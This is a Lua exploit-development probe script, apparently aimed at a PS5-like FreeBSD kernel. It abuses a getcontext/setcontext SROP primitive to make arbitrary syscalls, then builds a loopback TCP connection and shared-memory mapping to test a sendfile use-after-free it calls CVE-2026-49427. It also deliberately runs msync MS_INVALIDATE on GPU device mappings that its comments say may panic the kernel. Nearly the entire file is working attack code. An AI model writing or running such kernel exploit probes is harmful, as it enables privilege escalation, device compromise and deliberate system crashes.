-- CRASH_CLASS: HIGH
-- PROBE 157a: sendfile + SHM via connected loopback socket
--
-- 154a showed: shm_open(482)=27 works, sendfile(393) returns -1 with pipe dest.
-- sendfile requires a socket destination per FreeBSD semantics.
-- This probe creates a loopback TCP connection and uses the accepted socket.
--
-- Also tests: msync(65) on GPU mmap pages (CVE-2026-49418 device-pager path)
-- DEM9N101 found write+msync(MS_INVALIDATE) on dmem0 causes kernel panic.
-- We test msync on GPU mmap (device-pager backed) to see if it's the same bug.

print("=== PROBE 157a: SENDFILE+SOCKET+SHM ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=0x" .. string.format("%X%08X", gh, gl))

-- [A] Create loopback TCP connection
print("")
print("--- [A] LOOPBACK TCP CONNECTION ---")

-- socket(AF_INET=2, SOCK_STREAM=1, 0)
local srv = srop(97, uint64(2), uint64(1), uint64(0))
local srvv = srv and to_num(srv) or -1
print("server_socket=" .. srvv)

if srvv >= 0 then
    -- Build sockaddr_in at gpu+0x10000
    local sa = 0x10000
    -- sin_len=16, sin_family=AF_INET=2
    wd(gpu + sa, 0x0210)  -- len=16 family=2 (little endian: 10 02)
    -- sin_port = 7777 (0x1E61 in network byte order = 0x611E)
    -- Actually FreeBSD sockaddr_in: sin_len(1) sin_family(1) sin_port(2) sin_addr(4)
    -- Port 7777 = 0x1E61, network order = bytes 1E 61
    -- Let me write byte by byte
    local function wb(a, v) wd(a, v % 256) end

    -- Clear the sockaddr
    for i = 0, 15, 4 do wd(gpu + sa + i, 0) end
    -- sin_len = 16
    wb(gpu + sa + 0, 16)
    -- sin_family = AF_INET = 2
    wb(gpu + sa + 1, 2)
    -- sin_port = htons(7777) = 0x1E61
    wb(gpu + sa + 2, 0x1E)
    wb(gpu + sa + 3, 0x61)
    -- sin_addr = 127.0.0.1 = 0x7F000001
    wb(gpu + sa + 4, 127)
    wb(gpu + sa + 5, 0)
    wb(gpu + sa + 6, 0)
    wb(gpu + sa + 7, 1)

    -- setsockopt SO_REUSEADDR
    wd(gpu + sa + 0x20, 1)
    srop(105, uint64(srvv), uint64(0xFFFF), uint64(4), ga(sa + 0x20), uint64(4))

    -- bind(srv, sockaddr, 16)
    local bn = srop(104, uint64(srvv), ga(sa), uint64(16))
    local bnv = bn and to_num(bn) or -999
    print("bind=" .. bnv)

    if bnv == 0 then
        -- listen(srv, 5)
        local ls = srop(106, uint64(srvv), uint64(5))
        local lsv = ls and to_num(ls) or -999
        print("listen=" .. lsv)

        -- Create client socket
        local cli = srop(97, uint64(2), uint64(1), uint64(0))
        local cliv = cli and to_num(cli) or -1
        print("client_socket=" .. cliv)

        if cliv >= 0 then
            -- Set client non-blocking for connect
            wd(gpu + sa + 0x30, 1)
            srop(92, uint64(cliv), uint64(0x8004667E), ga(sa + 0x30))  -- FIONBIO

            -- connect(cli, sockaddr, 16)
            local cn = srop(98, uint64(cliv), ga(sa), uint64(16))
            local cnv = cn and to_num(cn) or -999
            print("connect=" .. cnv)

            -- accept(srv, NULL, NULL) — should have a pending connection
            local acc = srop(30, uint64(srvv), uint64(0), uint64(0))
            local accv = acc and to_num(acc) or -1
            print("accept=" .. accv)

            if accv >= 0 then
                print("*** LOOPBACK TCP CONNECTED ***")

                -- Set accepted socket back to blocking
                wd(gpu + sa + 0x30, 0)
                srop(92, uint64(accv), uint64(0x8004667E), ga(sa + 0x30))

                -- [B] Create SHM and sendfile through it
                print("")
                print("--- [B] SHM + SENDFILE ---")

                local name_off = 0x11000
                local nm = "/sf_test"
                for i = 1, #nm do wd(gpu + name_off + i - 1, string.byte(nm, i)) end
                wd(gpu + name_off + #nm, 0)

                local shm_fd = srop(482, ga(name_off), uint64(0x0202), uint64(0x1B6))
                local shmv = shm_fd and to_num(shm_fd) or -1
                print("shm_fd=" .. shmv)

                if shmv >= 0 then
                    local SHM_SIZE = 0x10000  -- 64KB = 4 PS5 pages
                    srop(480, uint64(shmv), uint64(SHM_SIZE))

                    local shm_map = srop(477, uint64(0), uint64(SHM_SIZE), uint64(3),
                        uint64(1), uint64(shmv), uint64(0))
                    local smh, sml = get_hi_lo(shm_map)
                    print("shm_map=0x" .. string.format("%X%08X", smh, sml))

                    if smh ~= 0xFFFFFFFF then
                        -- Write sentinels
                        for off = 0, SHM_SIZE - 4, 0x1000 do
                            pcall(function() memory.write_dword(shm_map + off, 0xCAFEBABE) end)
                        end

                        -- sendfile(shm_fd, accepted_socket, offset, nbytes, hdtr, sbytes, flags)
                        -- SF_NOCACHE = 0x10
                        local sbytes = gpu + 0x12000
                        wq(sbytes, uint64(0))

                        -- Try sendfile with SF_NOCACHE
                        local sf = srop(393, uint64(shmv), uint64(accv),
                            uint64(0), uint64(SHM_SIZE),
                            uint64(0), ga(0x12000), uint64(0x10))
                        local sfv = sf and to_num(sf) or -999
                        local sent = rq(sbytes)
                        local sh2, sl2 = get_hi_lo(sent)
                        print("sendfile(SF_NOCACHE)=" .. sfv .. " sent=" .. sl2)

                        -- If sendfile returned 0 and sent > 0, check for UAF
                        if sfv == 0 or sl2 > 0 then
                            print("*** SENDFILE SUCCEEDED! Checking for UAF... ***")

                            local uaf = false
                            for off = 0, SHM_SIZE - 4, 0x1000 do
                                local ok, val = pcall(function() return memory.read_dword(shm_map + off) end)
                                if not ok then
                                    print("  FAULT at +" .. string.format("%X", off))
                                    uaf = true
                                    break
                                else
                                    local v = to_num(val)
                                    if v ~= 0xCAFEBABE then
                                        print("  CHANGED at +" .. string.format("%X", off) ..
                                            ": 0x" .. string.format("%08X", v))
                                        uaf = true
                                    end
                                end
                            end
                            if uaf then
                                print("*** CVE-2026-49427 UAF CONFIRMED ***")
                            else
                                print("sentinels intact, no UAF")
                            end
                        else
                            -- Try without SF_NOCACHE
                            wq(sbytes, uint64(0))
                            sf = srop(393, uint64(shmv), uint64(accv),
                                uint64(0), uint64(SHM_SIZE),
                                uint64(0), ga(0x12000), uint64(0))
                            sfv = sf and to_num(sf) or -999
                            sent = rq(sbytes)
                            sh2, sl2 = get_hi_lo(sent)
                            print("sendfile(no_flags)=" .. sfv .. " sent=" .. sl2)
                        end

                        -- Read data from client side to drain
                        local rbuf = gpu + 0x13000
                        local rd_rv = srop(3, uint64(cliv), ga(0x13000), uint64(0x1000))
                        local rdv = rd_rv and to_num(rd_rv) or -999
                        print("client_read=" .. rdv)
                        if rdv > 0 then
                            local first = rd(gpu + 0x13000)
                            print("first_dword=0x" .. string.format("%08X", first))
                        end

                        srop(73, shm_map, uint64(SHM_SIZE))
                    end
                    srop(6, uint64(shmv))
                    srop(483, ga(name_off))
                end

                -- [C] Test msync on GPU mmap pages (CVE-2026-49418)
                print("")
                print("--- [C] MSYNC ON GPU MMAP ---")

                -- GPU mapping is device-pager backed
                -- msync(65): int msync(void *addr, size_t len, int flags)
                -- MS_ASYNC=1, MS_INVALIDATE=2, MS_SYNC=0
                -- DEM9N101: write + MS_INVALIDATE on dmem0 mapping causes panic
                -- Test with GPU mapping (less critical device)

                -- First test MS_ASYNC (safest)
                local ms1 = srop(65, gpu, uint64(0x4000), uint64(1))
                local ms1v = ms1 and to_num(ms1) or -999
                print("msync(GPU, MS_ASYNC)=" .. ms1v)

                -- Test MS_SYNC
                local ms2 = srop(65, gpu, uint64(0x4000), uint64(0))
                local ms2v = ms2 and to_num(ms2) or -999
                print("msync(GPU, MS_SYNC)=" .. ms2v)

                -- Test MS_INVALIDATE on one page only (DANGEROUS — may crash)
                -- Do this LAST and only if the above worked
                if ms1v ~= -999 and ms2v ~= -999 then
                    -- Allocate a separate GPU mapping to sacrifice
                    local sac = srop(477, uint64(0), uint64(0x4000), uint64(3),
                        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
                    local sach, sacl = get_hi_lo(sac)
                    if sach ~= 0xFFFFFFFF then
                        -- Write to it first (DEM9N101 required write before msync)
                        pcall(function() memory.write_dword(sac, 0x41414141) end)

                        -- MS_INVALIDATE on the sacrifice mapping
                        local ms3 = srop(65, sac, uint64(0x4000), uint64(2))
                        local ms3v = ms3 and to_num(ms3) or -999
                        print("msync(sacrifice, MS_INVALIDATE)=" .. ms3v)

                        if ms3v ~= -999 then
                            -- We survived! Check if the page is still readable
                            local ok, val = pcall(function() return memory.read_dword(sac) end)
                            if ok then
                                print("sacrifice_read=0x" .. string.format("%08X", to_num(val)))
                            else
                                print("sacrifice_read=FAULT (pages freed!)")
                            end
                        end

                        srop(73, sac, uint64(0x4000))
                    end
                end

                srop(6, uint64(accv))
            else
                print("accept failed, trying connect first approach")
            end
            srop(6, uint64(cliv))
        end
    else
        -- Try different port
        print("bind failed, trying port 9999")
        wb(gpu + sa + 2, 0x27)
        wb(gpu + sa + 3, 0x0F)
        bn = srop(104, uint64(srvv), ga(sa), uint64(16))
        bnv = bn and to_num(bn) or -999
        print("bind(9999)=" .. bnv)
    end
    srop(6, uint64(srvv))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
